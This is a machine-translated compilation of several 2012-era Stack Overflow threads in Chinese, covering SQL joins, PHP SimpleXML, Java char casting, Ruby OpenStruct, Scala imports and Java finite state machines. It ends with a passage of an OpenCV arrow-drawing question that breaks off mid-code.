我得到加入 2 个表，但使用 3 个表。我不需要重复值。但我尝试加入有重复。

表`peopleAll`：

```
pNo    pName
-------------
00001  Sang
00002  Janta
00003  Els
00004  Est
00005  Sam
00006  John
00007  Misan
00008  Wila
00009  light
00010  Smith
00011  Ritpo 
```

表`fTime`：

```
cNo    cDate                     cIn                        cOut
-----------------------------------------------------------------------------------
00001  2012-10-22 00:00:00.000   2012-10-22 07:59:00.000    2012-10-22 20:34:00.000
00002  2012-10-22 00:00:00.000   2012-10-22 12:50:00.000    2012-10-22 19:50:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 12:01:00.000    2012-10-22 20:30:00.000
00004  2012-10-22 00:00:00.000   2012-10-22 07:55:00.000    2012-10-22 20:30:00.000
00005  2012-10-22 00:00:00.000   2012-10-22 07:27:00.000    2012-10-22 20:31:00.000
00010  2012-10-22 00:00:00.000   2012-10-22 07:12:00.000    2012-10-22 20:22:00.000 
```

表`Leave`：

```
lNo    lDate                     lStart                     lStop
-----------------------------------------------------------------------------------
00002  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00011  2012-10-22 00:00:00.000   NULL                       NULL 
```

此 SQL 代码：

```
SELECT lr.lNo, lr.lDate, lr.lStart, lr.lStop 
FROM Leave lr 
Where lr.cStart = '2012-10-22'

UNION ALL

SELECT pa.pNo, ISNULL(tf.cDate, Convert(nvarchar(10),'2012-10-22',114)),tf.cIn, tf.cOut
FROM fTime tf FULL OUTER join peopleAll pa On tf.cNo = pa.pNo AND 
tf.cDate = Convert(nvarchar(10),'2012-10-22',114) 
```

返回此输出：

```
lNo    lDate                     lStart                     lStop
-----------------------------------------------------------------------------------
00001  2012-10-22 00:00:00.000   2012-10-22 07:59:00.000    2012-10-22 20:34:00.000
00002  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00002  2012-10-22 00:00:00.000   2012-10-22 12:50:00.000    2012-10-22 19:50:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 12:01:00.000    2012-10-22 20:30:00.000
00004  2012-10-22 00:00:00.000   2012-10-22 07:55:00.000    2012-10-22 20:30:00.000
00005  2012-10-22 00:00:00.000   2012-10-22 07:27:00.000    2012-10-22 20:31:00.000
00006  2012-10-22 00:00:00.000   NULL                       NULL
00007  2012-10-22 00:00:00.000   NULL                       NULL
00008  2012-10-22 00:00:00.000   NULL                       NULL
00009  2012-10-22 00:00:00.000   NULL                       NULL
00010  2012-10-22 00:00:00.000   2012-10-22 07:12:00.000    2012-10-22 20:22:00.000
00011  2012-10-22 00:00:00.000   NULL                       NULL 
```

`FULL OUTER JOIN`然后我尝试更改`LEFT OUTER JOIN`并得到输出：

```
lNo    lDate                     lStart                     lStop
-----------------------------------------------------------------------------------
00002  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00002  2012-10-22 00:00:00.000   2012-10-22 12:50:00.000    2012-10-22 19:50:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 08:00:00.000    2012-10-22 12:00:00.000
00003  2012-10-22 00:00:00.000   2012-10-22 12:01:00.000    2012-10-22 20:30:00.000
00004  2012-10-22 00:00:00.000   2012-10-22 07:55:00.000    2012-10-22 20:30:00.000
00007  2012-10-22 00:00:00.000   NULL                       NULL
00008  2012-10-22 00:00:00.000   NULL                       NULL
00010  2012-10-22 00:00:00.000   2012-10-22 07:12:00.000    2012-10-22 20:22:00.000
00011  2012-10-22 00:00:00.000   NULL                       NULL 
```

LEFT OUTER join 错过了一些字段？？

我需要这个输出：

```
lNo    lDate                     lStart                     lStop
-----------------------------------------------------------------------------------
00001  2012-10-22 00:00:00.000   2012-10-22 07:59:00.000    2012-10-22 20:34:00.000
00002  2012-10-22 00:00:00.000   2012-10-22 12:50:00.000    2012-10-22 19:50:00.000 
00003  2012-10-22 00:00:00.000   2012-10-22 12:01:00.000    2012-10-22 20:30:00.000
00004  2012-10-22 00:00:00.000   2012-10-22 07:55:00.000    2012-10-22 20:30:00.000
00005  2012-10-22 00:00:00.000   2012-10-22 07:27:00.000    2012-10-22 20:31:00.000
00006  2012-10-22 00:00:00.000   NULL                       NULL
00007  2012-10-22 00:00:00.000   NULL                       NULL
00008  2012-10-22 00:00:00.000   NULL                       NULL
00009  2012-10-22 00:00:00.000   NULL                       NULL
00010  2012-10-22 00:00:00.000   2012-10-22 07:12:00.000    2012-10-22 20:22:00.000
00011  2012-10-22 00:00:00.000   NULL                       NULL

(00002,00003 from fTime) 
```

请帮我。谢谢你的时间。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T18:04:19.110

```
Select p.pNo
,Coalesce(l.cDate,t.lDate,'2012-10-22') as ldate
,Coalesce(l.lStart,t.cIn) as lstart
,Coalesce(l.lStop,t.cOut  ) as lstop
from peopleall p
left join leave l on l.lNo=p.Pno and l.ldate='2012-10-22'
left join fTime t on t.tNo=p.Pno and t.cDate='2012-10-22' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T18:07:32.573

试试这个

```
Select p.pNo , 
Coalesce(l.lDate , ftemp.cDate , NULL) as lDate , 
Coalesce(l.lStart,ftemp.cIn , NULL)  as lStart ,
Coalesce(l.lStop , ftemp.cOut, NULL ) as lStop 
from peopleAll p  
left join Leave l  on (p.pNo = l.lNo ) 
left join 
  (select cNo, cDate ,cIn, cOut 
     from  fTime ft where not exists (select 1 from Leave l2 
                                      where ft.cNo = l2.lNo )) 
     ftemp
on (ftemp.cNo = p.pNo ) 
```

如果你得到一个错误，你能把输出发给我吗？

# php - XML 解析使用但元素名称是动态的

> ID：13221155
> 
> 赞同：0
> 
> 时间：2012-11-04T17:44:48.537
> 
> 标签：php, xml, simplexml

```
Simple XMLElement Object
(    
         [IpStatus] => 1    
         [ti_pid_20642] => SimpleXmlElement Object    
               ( 
```

我有一个上述格式的 SimpleXMLElment，这个 XML 是在运行时生成的，它的节点值`ti_pid_20642`部分是动态的，例如`ti_pid_3232`, `ti-pid_2323`, `ti_pid_anyumber`。

我的问题是如何获取这些节点值以及使用 PHP 的子节点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T18:14:04.390

要使用 SimpleXML 获取 XML*字符串*中使用的所有节点名称，您可以使用`SimpleXMLIterator`：

```
$tagnames = array_keys(iterator_to_array(
    new RecursiveIteratorIterator(
        new SimpleXMLIterator($string)
        , RecursiveIteratorIterator::SELF_FIRST
    )
));

print_r($tagnames); 
```

这可以给你示范（你没有在你的问题中给出任何 XML，[Demo](http://codepad.org/QWhqD3sh)）：

```
Array
(
    [0] => IpStatus
    [1] => ti_pid_20642
    [2] => dependend
    [3] => ti-pid_2323
    [4] => ti_pid_anyumber
    [5] => more
) 
```

如果您在提供包含有效 XML 的字符串时遇到问题，请使用您现有的 SimpleXMLelement 并从中[创建一个 XML 字符串](http://php.net/simplexmlelement.asxml)：

```
$string = $simpleXML->asXML(); 
```

但是，如果您想从 SimpleXML 对象中获取所有标记名，但又不想将其转换为字符串，您也可以创建一个递归迭代器`SimpleXMLElement`：

```
class SimpleXMLElementIterator extends IteratorIterator implements RecursiveIterator
{
    private $element;

    public function __construct(SimpleXMLElement $element) {
        parent::__construct($element);
    }

    public function hasChildren() {
        return (bool)$this->current()->children();
    }

    public function getChildren() {
        return new self($this->current()->children());
    }
} 
```

它的用法类似（[Demo](http://codepad.org/po8qVodV)）：

```
$it      = new RecursiveIteratorIterator(
    new SimpleXMLElementIterator($xml), RecursiveIteratorIterator::SELF_FIRST
);
$tagnames = array_keys(iterator_to_array($it)); 
```

这取决于你需要什么。

有了命名空间的元素，这变得不那么直接了。取决于您是否只想获取本地名称或命名空间名称，甚至是带有标记名的命名空间 URI。

可以更改给定`SimpleXMLElementIterator`以支持跨命名空间元素的迭代，默认情况下 simplexml 仅提供对默认命名空间中元素的遍历：

```
/**
 * SimpleXMLElementIterator over all child elements across namespaces 
 */
class SimpleXMLElementIterator extends IteratorIterator implements RecursiveIterator
{
    private $element;

    public function __construct(SimpleXMLElement $element) {
        parent::__construct(new ArrayIterator($element->xpath('./*')));
    }

    public function key() {
        return $this->current()->getName();
    }

    public function hasChildren() {
        return (bool)$this->current()->xpath('./*');
    }

    public function getChildren() {
        return new self($this->current());
    }
} 
```

然后，您需要检查每个元素的名称空间 - 例如，使用名称空间的修改后的 XML 文档：

```
<root xmlns="namspace:default" xmlns:ns1="namespace.numbered.1">
    <ns1:IpStatus>1</ns1:IpStatus>
    <ti_pid_20642>
        <dependend xmlns="namspace:depending">
            <ti-pid_2323>ti-pid_2323</ti-pid_2323>
            <ti_pid_anyumber>ti_pid_anyumber</ti_pid_anyumber>
            <more xmlns:ns2="namspace.numbered.2">
                <ti_pid_20642 ns2:attribute="test">ti_pid_20642</ti_pid_20642>
                <ns2:ti_pid_20642>ti_pid_20642</ns2:ti_pid_20642>
            </more>
        </dependend>
    </ti_pid_20642>
</root> 
```

结合`SimpleXMLIterator`上面的更新，以下示例代码演示了新行为：

```
$xml = new SimpleXMLElement($string);
$it  = new RecursiveIteratorIterator(
    new SimpleXMLElementIterator($xml), RecursiveIteratorIterator::SELF_FIRST
);

$count = 0;
foreach ($it as $name => $element) {
    $nsList = $element->getNamespaces();
    list($ns, $nsUri) = each($nsList);
    printf("#%d:  %' -20s  %' -4s  %s\n", ++$count, $name, $ns, $nsUri);
} 
```

输出（[演示](http://codepad.org/zc7rrgz6)）：

```
#1:  IpStatus              ns1   namespace.numbered.1
#2:  ti_pid_20642                namspace:default
#3:  dependend                   namspace:depending
#4:  ti-pid_2323                 namspace:depending
#5:  ti_pid_anyumber             namspace:depending
#6:  more                        namspace:depending
#7:  ti_pid_20642                namspace:depending
#8:  ti_pid_20642          ns2   namspace.numbered.2 
```

玩得开心。

# java - 将超出范围的 int 转换为 char。精度损失真的是一个问号吗？

> ID：13221158
> 
> 赞同：1
> 
> 时间：2012-11-04T17:45:01.923
> 
> 标签：java, casting, char

我的头被 SCJP 6 学习指南困住了，对他们在这里提出的观点感到困惑。

关于将整数转换为字符，他们说以下内容是完全合法的，但是您会失去精度（我完全可以理解）：

```
 char d = (char)-98;
    char c = (char)70000;
    System.out.println("d = " + d + " c = " + c); 
```

结果是：

```
d = ? c = ? 
```

我感到困惑的一点是，在这两种情况下，生成的 char 值都只是作为问号打印出来。我本来期望一个无意义的数值，可能与原始值几乎没有关系或根本没有关系，但仍然是数字的。

为什么结果是问号？我不明白这里的“精度损失”只是一个问号吗？

我在 SO 上查看了许多与 char 相关的问题，也搜索了很多，但找不到答案。

它与其他JVM不同吗？或者它是对所有超出范围的字符转换的标准响应？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T17:50:55.697

当您将 char 附加到 String 时，附加的是 char（例如 'a'），而不是其数值（例如 97）。如果您想知道 char 的数值是什么，请使用

```
System.out.println("d = " + ((int) d) + " c = " + ((int) c)); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T17:51:19.143

如果将这些字符转换回整数，您会看到它们的值分别为 65438 和 4464。这些对应于 Unicode 字符 U+FF9E HALFWIDTH KATAKANA VOICED SOUND MARK 和 U+1170 HANGUL JUNGSEONG WE。将它们打印为字符时会出现问号，因为您的系统只是没有为这些字符提供字形的字体。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-04T17:50:11.550

字符实际上是`ff9e`and `1170`，它们应该看起来是

![在此处输入图像描述](../Images/b90d33df1f16405fb545b1e1609b8308.png) ![在此处输入图像描述](../Images/9a8bfb29f55e2390d9e66d6b54caf72c.png)

只是您的系统无法显示它们。

[http://www.fileformat.info/info/unicode/char/ff9e/index.htm](http://www.fileformat.info/info/unicode/char/ff9e/index.htm)

[http://www.fileformat.info/info/unicode/char/1170/index.htm](http://www.fileformat.info/info/unicode/char/1170/index.htm)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-04T17:51:37.650

```
System.out.println((char)65); 
```

打印出来

> 一个

因此，具有损失精度的转换不是问号，而是在应用转换后将其转换为 char 的值的 char 表示。

# ruby - OpenStruct.new 存储属性但不检索它

> ID：13221163
> 
> 赞同：4
> 
> 时间：2012-11-04T17:45:44.207
> 
> 标签：ruby, null, openstruct

创建一个新的 Ruby OpenStruct 对象后，我可以存储属性但不能检索它们（我得到一个空行，而是返回`nil`）：

```
obj = OpenStruct.new # => #<OpenStruct>
obj.x = 10
obj.y = 20
obj                  # => #<OpenStruct x=10, y=20>
obj.x                # => 10
obj.y                #  
                     # => nil 
```

如果我尝试存储具有不同名称的其他属性，一切都会按预期工作。这个问题似乎只在我存储一个名为`y`. 我正在使用以下版本：

`ruby 1.9.2p320 (2012-04-20 revision 35421) [i686-linux]`

有人知道发生了什么吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T18:27:50.253

某个地方正在吸引[`Psych`](https://ruby-doc.org/stdlib/libdoc/psych/rdoc/Psych.html)YAML 的东西。心理[补丁`Kernel`](https://ruby-doc.org/stdlib/libdoc/psych/rdoc/Kernel.html)以添加`psych_y`别名为`y`. 所以，一切都`y`定义了一个方法：

```
> o = OpenStruct.new
> o.method(:y)
 => #<Method: OpenStruct(Kernel)#psych_y> 
```

AFAIK，OpenStruct 使用[`method_missing`](https://ruby-doc.org/core/BasicObject.html#method-i-method_missing)内部哈希来生成访问器和修改器方法；但是，已经有一个`y`来自内核的“友好”补丁，因此 OpenStruct 的魔法无法处理该`y`方法，因为 Psych 的魔法阻碍了。mutator`y=`很好，所以你可以安全地`o.y = 11`看到你的`11`内部`o`。

你可以删除`y`这样的：

```
> o = OpenStruct.new
> o.class_eval('undef_method :y')
> o.y = 11
> o.y
 => 11 
```

您可能可以从中删除该方法，`Kernel`并希望没有什么依赖于那个愚蠢的`y`别名：

```
> Kernel.send(:undef_method, :y)
> o = OpenStruct.new
> o.y = 11
> o.y
 => 11 
```

或者您可以将其从以下位置删除`OpenStruct`：

```
> OpenStruct.send(:undef_method, :y)
> o = OpenStruct.new
> o.y = 11
> o.y
 => 11 
```

这就是为什么很多人不喜欢猴子补丁的原因，尤其是猴子补丁这样基本的东西`Kernel`。

# scala - 如何在相对包导入中引用父包？

> ID：13221166
> 
> 赞同：4
> 
> 时间：2012-11-04T17:46:02.897
> 
> 标签：scala, import, package

我想以与 bash 表达式类似的方式导入包`com.example.abc`。`com.example.iop``../abc`

这在 Scala 中可行吗？我读过几篇文章，但他们对我的情况只字未提。

* * *

更新：我发现了适合简单用途的代码（我之前在某个项目中看到过）：

```
package com.example
package com.example.abc

import iop 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T23:31:32.903

您更新的包结构有解决方案的提示，但不太正确。您可以生活在多个包中，包括由第一个包语句定义的广泛父包 - 后续语句细化树。

```
package com.foo   //        we're in: com.foo
package bar       //   we're also in: com.foo.bar
package wibble    //   we're also in: com.foo.bar.wibble

import frobble._  //   this could be com.foo.frobble or com.foo.bar.frobble or com.foo.bar.wibble.frobble 
```

显然，如果您有多个具有相同名称的包，事情可能会变得混乱，但编译器会礼貌地要求您对其进行分类。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-04T17:55:20.150

这根本不可能——就像在 Java 中一样。

# java - 如何在 Java 中实现 FSM - 有限状态机

> ID：13221168
> 
> 赞同：57
> 
> 时间：2012-11-04T17:46:07.960
> 
> 标签：java, design-patterns, state-machine, fsm, state-pattern

我有工作要做，我需要你的帮助。我们要实现 a `FSM - Finite State Machine`，来识别字符序列（例如：A、B、C、A、C），并判断它是否被接受。

我们认为要实现三个类`State`：`Event`和`Machine`。该类`state`在 中表示一个节点`FSM`，我们认为用 来实现它`State design pattern`，每个节点都将从抽象类状态扩展，每个类将处理不同类型的事件并指示到新状态的转换。你认为这是个好主意吗？

第二件事，我们不知道如何保存所有的转换。我们再次考虑用某种 来实现它`map`，它保持起点并获得某种带有下一个状态的向量，但我不确定这是一个好主意。

我很乐意得到一些关于如何实现它的想法，或者你可以给我一些起点。

我应该如何保存 FSM，这意味着我应该如何在程序开始时构建树？我用谷歌搜索并找到了很多例子，但没有什么对我有帮助。

非常感谢。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-11-05T01:06:14.797

状态机的核心是转换表，它将状态和符号（您称之为事件）带到新状态。这只是一个包含两个索引的状态数组。为了理智和类型安全，将状态和符号声明为枚举。我总是以某种方式（特定于语言）添加一个“长度”成员来检查数组边界。当我手动编码 FSM 时，我使用空白摆弄将代码格式化为行和列格式。状态机的其他元素是初始状态和接受状态集。接受状态集的最直接实现是由状态索引的布尔数组。然而，在 Java 中，枚举是类，您可以指定一个参数“accepting”

对于机器类型，您可以将其编写为泛型类。它需要两个类型参数，一个用于状态，一个用于符号，一个用于转换表的数组参数，一个用于初始状态的单个状态。唯一的其他细节（尽管它很关键）是您必须调用 Enum.ordinal() 以获得适合索引转换数组的整数，因为您没有直接声明具有枚举索引的数组的语法（尽管应该是）。

抢占一个问题，`EnumMap`不适用于转换表，因为所需的键是一对枚举值，而不是单个值。

```
enum State {
    Initial( false ),
    Final( true ),
    Error( false );
    static public final Integer length = 1 + Error.ordinal();

    final boolean accepting;

    State( boolean accepting ) {
        this.accepting = accepting;
    }
}

enum Symbol {
    A, B, C;
    static public final Integer length = 1 + C.ordinal();
}

State transition[][] = {
    //  A               B               C
    {
        State.Initial,  State.Final,    State.Error
    }, {
        State.Final,    State.Initial,  State.Error
    }
}; 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2014-04-08T08:19:04.553

EasyFSM 是一个动态 Java 库，可用于实现 FSM。

您可以在以下位置找到相同的文档： [Java 中的有限状态机](http://dynamicfsm.blogspot.in/)

此外，您可以在以下位置下载该库： [Java FSM 库：DynamicEasyFSM](https://sourceforge.net/p/java-easyfsm/)

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2016-04-01T12:00:51.937

您可以通过两种不同的方式实现有限状态机。

*选项1：*

*具有预定义工作流的有限状态机*：如果您提前知道所有状态并且状态机几乎是固定的，将来没有任何更改，建议您使用

1.  识别应用程序中所有可能的*状态*

2.  识别应用程序中的所有*事件*

3.  识别应用程序中可能导致状态转换的所有*条件*

4.  事件的发生可能会导致状态*转换*

5.  *通过确定状态和转换的工作流程*来构建有限状态机。

    例如，如果在状态 1 发生事件 1，则状态将被更新并且机器状态可能仍处于状态 1。

    如果在状态 1 发生事件 2，在某些条件评估中，系统将从状态 1 移动到状态 2

此设计基于*状态*和*上下文*模式。

看看[有限状态机](https://github.com/benzonico/ruling_java/tree/master/sslr/oracle-jdk-1.7.0.3/com/sun/corba/se/spi/orbutil/fsm)原型类。

*选项 2：*

*行为树：* 如果状态机工作流程频繁更改，建议使用。您可以在不破坏树的情况下动态添加新行为。

[![在此处输入图像描述](../Images/49eb6bfa6efee54ab82c654008f3edea.png)](https://i.stack.imgur.com/5qItb.png)

基*任务*类为所有这些任务提供了一个接口，*叶任务*就是刚才提到的那些，父任务是决定接下来执行哪个任务的内部节点。

*Tasks*只有他们需要做的逻辑，所有关于一个task是否开始、是否需要更新、是否成功完成等的决策逻辑都被分组在*TaskController*中类，并通过组合添加。

*装饰器*是通过包装另一个类并为其提供额外逻辑来“装饰”另一个类的任务。

最后，*Blackboard*类是父 AI 拥有的类，每个任务都有引用。它作为所有叶子任务的知识数据库

查看*Jaime Barrachina Verdia*的这篇[文章](http://magicscrollsofcode.blogspot.in/2010/12/behavior-trees-by-example-ai-in-android.html)了解更多详情

 ** * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-11-05T11:14:57.067

嗯，我建议你使用享元来实现状态。目的：避免大量小对象的内存开销。状态机可以变得非常非常大。

[http://en.wikipedia.org/wiki/Flyweight_pattern](http://en.wikipedia.org/wiki/Flyweight_pattern)

我不确定是否需要使用设计模式状态来实现节点。状态机中的节点是无状态的。它们只是将当前输入符号与当前状态的可用转换相匹配。也就是说，除非我完全忘记了它们是如何工作的（这是绝对可能的）。

如果我正在编码它，我会做这样的事情：

```
interface FsmNode {
  public boolean canConsume(Symbol sym);
  public FsmNode consume(Symbol sym);
  // Other methods here to identify the state we are in
}

  List<Symbol> input = getSymbols();
  FsmNode current = getStartState();
  for (final Symbol sym : input) {
    if (!current.canConsume(sym)) {
      throw new RuntimeException("FSM node " + current + " can't consume symbol " + sym);
    }
    current = current.consume(sym);
  }
  System.out.println("FSM consumed all input, end state is " + current); 
```

在这种情况下 Flyweight 会做什么？好吧，在 FsmNode 下面可能会有这样的东西：

```
Map<Integer, Map<Symbol, Integer>> fsm; // A state is an Integer, the transitions are from symbol to state number
FsmState makeState(int stateNum) {
  return new FsmState() {
    public FsmState consume(final Symbol sym) {
      final Map<Symbol, Integer> transitions = fsm.get(stateNum);
      if (transisions == null) {
        throw new RuntimeException("Illegal state number " + stateNum);
      }
      final Integer nextState = transitions.get(sym);  // May be null if no transition
      return nextState;
    }
    public boolean canConsume(final Symbol sym) {
      return consume(sym) != null;
    }
  }
} 
```

这会在需要使用的基础上创建状态对象，它允许您使用更有效的底层机制来存储实际的状态机。我在这里使用的那个 (Map(Integer, Map(Symbol, Integer))) 并不是特别有效。

请注意，Wikipedia 页面侧重于许多有些相似的对象共享相似数据的情况，如 Java 中的 String 实现中的情况。在我看来，享元更通用一点，涵盖了任何按需创建生命周期较短的对象（使用更多 CPU 来节省更高效的底层数据结构）。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2016-04-25T17:36:42.557

考虑简单、轻量级的 Java 库[EasyFlow](https://github.com/Beh01der/EasyFlow)。从他们的文档中：

> 使用 EasyFlow，您可以：
> 
> *   实现复杂的逻辑，但保持代码简单干净
> *   轻松优雅地处理异步调用
> *   通过使用事件驱动的编程方法避免并发
> *   通过避免递归来避免 StackOverflow 错误
> *   简化复杂 Java 应用程序的设计、编程和测试

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2018-08-03T17:15:26.897

我用java设计并实现了一个简单的有限状态机示例。

**IFiniteStateMachine**：管理有限状态机的公共接口，
例如向有限状态机添加新状态或通过
特定操作转换到下一个状态。

```
interface IFiniteStateMachine {
    void setStartState(IState startState);

    void setEndState(IState endState);

    void addState(IState startState, IState newState, Action action);

    void removeState(String targetStateDesc);

    IState getCurrentState();

    IState getStartState();

    IState getEndState();

    void transit(Action action);
} 
```

**IState**：获取状态相关信息的公共接口，
例如状态名称和连接状态的映射。

```
interface IState {
    // Returns the mapping for which one action will lead to another state
    Map<String, IState> getAdjacentStates();

    String getStateDesc();

    void addTransit(Action action, IState nextState);

    void removeTransit(String targetStateDesc);
} 
```

**Action**：将导致状态转换的类。

```
public class Action {
    private String mActionName;

    public Action(String actionName) {
        mActionName = actionName;
    }

    String getActionName() {
        return mActionName;
    }

    @Override
    public String toString() {
        return mActionName;
    }

} 
```

**StateImpl**：IState 的实现。我应用了**HashMap**等数据结构来保持 Action-State 映射。

```
public class StateImpl implements IState {
    private HashMap<String, IState> mMapping = new HashMap<>();
    private String mStateName;

    public StateImpl(String stateName) {
        mStateName = stateName;
    }

    @Override
    public Map<String, IState> getAdjacentStates() {
        return mMapping;
    }

    @Override
    public String getStateDesc() {
        return mStateName;
    }

    @Override
    public void addTransit(Action action, IState state) {
        mMapping.put(action.toString(), state);
    }

    @Override
    public void removeTransit(String targetStateDesc) {
        // get action which directs to target state
        String targetAction = null;
        for (Map.Entry<String, IState> entry : mMapping.entrySet()) {
            IState state = entry.getValue();
            if (state.getStateDesc().equals(targetStateDesc)) {
                targetAction = entry.getKey();
            }
        }
        mMapping.remove(targetAction);
    }

} 
```

**FiniteStateMachineImpl**：IFiniteStateMachine 的实现。我使用 ArrayList 来保留所有状态。

```
public class FiniteStateMachineImpl implements IFiniteStateMachine {
    private IState mStartState;
    private IState mEndState;
    private IState mCurrentState;
    private ArrayList<IState> mAllStates = new ArrayList<>();
    private HashMap<String, ArrayList<IState>> mMapForAllStates = new HashMap<>();

    public FiniteStateMachineImpl(){}
    @Override
    public void setStartState(IState startState) {
        mStartState = startState;
        mCurrentState = startState;
        mAllStates.add(startState);
        // todo: might have some value
        mMapForAllStates.put(startState.getStateDesc(), new ArrayList<IState>());
    }

    @Override
    public void setEndState(IState endState) {
        mEndState = endState;
        mAllStates.add(endState);
        mMapForAllStates.put(endState.getStateDesc(), new ArrayList<IState>());
    }

    @Override
    public void addState(IState startState, IState newState, Action action) {
        // validate startState, newState and action

        // update mapping in finite state machine
        mAllStates.add(newState);
        final String startStateDesc = startState.getStateDesc();
        final String newStateDesc = newState.getStateDesc();
        mMapForAllStates.put(newStateDesc, new ArrayList<IState>());
        ArrayList<IState> adjacentStateList = null;
        if (mMapForAllStates.containsKey(startStateDesc)) {
            adjacentStateList = mMapForAllStates.get(startStateDesc);
            adjacentStateList.add(newState);
        } else {
            mAllStates.add(startState);
            adjacentStateList = new ArrayList<>();
            adjacentStateList.add(newState);
        }
        mMapForAllStates.put(startStateDesc, adjacentStateList);

        // update mapping in startState
        for (IState state : mAllStates) {
            boolean isStartState = state.getStateDesc().equals(startState.getStateDesc());
            if (isStartState) {
                startState.addTransit(action, newState);
            }
        }
    }

    @Override
    public void removeState(String targetStateDesc) {
        // validate state
        if (!mMapForAllStates.containsKey(targetStateDesc)) {
            throw new RuntimeException("Don't have state: " + targetStateDesc);
        } else {
            // remove from mapping
            mMapForAllStates.remove(targetStateDesc);
        }

        // update all state
        IState targetState = null;
        for (IState state : mAllStates) {
            if (state.getStateDesc().equals(targetStateDesc)) {
                targetState = state;
            } else {
                state.removeTransit(targetStateDesc);
            }
        }

        mAllStates.remove(targetState);

    }

    @Override
    public IState getCurrentState() {
        return mCurrentState;
    }

    @Override
    public void transit(Action action) {
        if (mCurrentState == null) {
            throw new RuntimeException("Please setup start state");
        }
        Map<String, IState> localMapping = mCurrentState.getAdjacentStates();
        if (localMapping.containsKey(action.toString())) {
            mCurrentState = localMapping.get(action.toString());
        } else {
            throw new RuntimeException("No action start from current state");
        }
    }

    @Override
    public IState getStartState() {
        return mStartState;
    }

    @Override
    public IState getEndState() {
        return mEndState;
    }
} 
```

**例子**：

```
public class example {

    public static void main(String[] args) {
        System.out.println("Finite state machine!!!");
        IState startState = new StateImpl("start");
        IState endState = new StateImpl("end");
        IFiniteStateMachine fsm = new FiniteStateMachineImpl();
        fsm.setStartState(startState);
        fsm.setEndState(endState);
        IState middle1 = new StateImpl("middle1");
        middle1.addTransit(new Action("path1"), endState);
        fsm.addState(startState, middle1, new Action("path1"));
        System.out.println(fsm.getCurrentState().getStateDesc());
        fsm.transit(new Action(("path1")));
        System.out.println(fsm.getCurrentState().getStateDesc());
        fsm.addState(middle1, endState, new Action("path1-end"));
        fsm.transit(new Action(("path1-end")));
        System.out.println(fsm.getCurrentState().getStateDesc());
        fsm.addState(endState, middle1, new Action("path1-end"));
    }

} 
```

[Github 上的完整示例](https://github.com/shanwu/finite_state_machine)

* * *

## 回答 #7

> 赞同：-2
> 
> 时间：2020-06-15T20:55:44.840

这是一个超级简单的 FSM 实现/示例，仅使用“if-else”，它避免了上述所有子类化答案（取自[Using Finite State Machines for Pattern Matching in Java](https://www.youtube.com/watch?v=ZfW7FwuBd90)，他正在寻找一个以结尾的字符串“@”后跟数字，后跟“#”——参见[此处](https://ibb.co/Hqxj2w3)的状态图）：

```
public static void main(String[] args) {
    String s = "A1@312#";
    String digits = "0123456789";
    int state = 0;
    for (int ind = 0; ind < s.length(); ind++) {
        if (state == 0) {
            if (s.charAt(ind) == '@')
                state = 1;
        } else {
            boolean isNumber = digits.indexOf(s.charAt(ind)) != -1;
            if (state == 1) {
                if (isNumber)
                    state = 2;
                else if (s.charAt(ind) == '@')
                    state = 1;
                else
                    state = 0;
            } else if (state == 2) {
                if (s.charAt(ind) == '#') {
                    state = 3;
                } else if (isNumber) {
                    state = 2;
                } else if (s.charAt(ind) == '@')
                    state = 1;
                else
                    state = 0;
            } else if (state == 3) {
                if (s.charAt(ind) == '@')
                    state = 1;
                else
                    state = 0;
            }
        }
    } //end for loop

    if (state == 3)
        System.out.println("It matches");
    else
        System.out.println("It does not match");
} 
```

PS：不直接回答您的问题，而是向您展示如何在 Java 中非常轻松地实现 FSM。*

# c++ - 在opencv中旋转箭头

> ID：13221170
> 
> 赞同：0
> 
> 时间：2012-11-04T17:46:25.747
> 
> 标签：c++, opencv, polyline

我写了这段代码在opencv MAT图像上绘制块箭头，它可以工作，但我的问题是，有没有更简单的方法来旋转图像？是否需要详细编码或者opencv中是否有旋转转置或翻转方法？

```
void Arrow( Mat img, int i ) 
    {  
  int lineType = 8;
  Point arrow_points[1][7];
if (i == 1) { //left  
  arrow_points[0][0] = Point( 90*mp, 60*mp );
  arrow_points[0][1] = Point( 90*mp, 40*mp );
  arrow_points[0][2] = Point( 50*mp, 40*mp );
  arrow_points[0][3] = Point( 50*mp, 30*mp );
  arrow_points[0][4] = Point( 10*mp, 50*mp );
  arrow_points[0][5] = Point( 50*mp, 70*mp );
  arrow_points[0][6] = Point( 50*mp, 60*mp );
};
if (i == 2) { //right 
  arrow_points[0][0] = Point( 20*mp, 60*mp );
  arrow_points[0][1] = Point( 20*mp, 40*mp );
  arrow_points[0][2] = Point( 60*mp, 40*mp );
  arrow_points[0][3] = Point( 60*mp, 30*mp );
  arrow_points[0][4] = Point( 100*mp, 50*mp );
  arrow_points[0][5] = Point( 60*mp, 70*mp );
  arrow_points[0][6] = Point( 60*mp, 60*mp );
};
if (i == 3) { //down
  arrow_points[0][0] = Point( 60*mp, 20*mp );
  arrow_points[0][1] = Point( 40*mp, 20*mp );
